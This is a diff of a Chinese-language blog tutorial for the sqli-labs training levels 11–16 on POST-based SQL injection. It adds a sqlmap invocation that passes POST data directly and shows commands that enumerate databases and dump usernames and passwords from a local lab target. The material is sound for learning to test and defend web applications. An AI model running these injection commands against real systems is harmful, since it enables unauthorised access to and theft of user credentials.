@@ -2,7 +2,7 @@
  title: Sqlilabs通关笔记(11-16)POST基本注入
  date: 2020-01-06 14:35:27
  tags: SQL注入
- categories:
+ categories: SQL注入
 ---
 
 ## 第十一关 基于错误的POST单引号字符型注入
@@ -72,9 +72,15 @@
 
 ![2020-1-6-17-16-3](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-6-17-16-3)
 
+**如果要指定参数注入检测可以将该参数修改成***
+
 4. 使用sqlmap载入导出的数据包并进行注入检测
 
 > sqlmap -r "1.txt" -p uname -D security -T users -C username,password --dump --technique ES --batch --threads 10
+
+5. 也可以使用--data传入post参数
+> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-15/" -data "uname=admin&passwd=admin&submit=Submit" --b
+atch --threads 10 --technique T --dbs
 
 * -r 读取抓包文件
 * -p 需要检测的参数
@@ -83,5 +89,6 @@
     - S 通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入
 * --batch 默认选择
 * --threads 线程数
+* -data 传入post参数（免去抓包）
 
 ![2020-1-6-17-23-54](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-6-17-23-54)
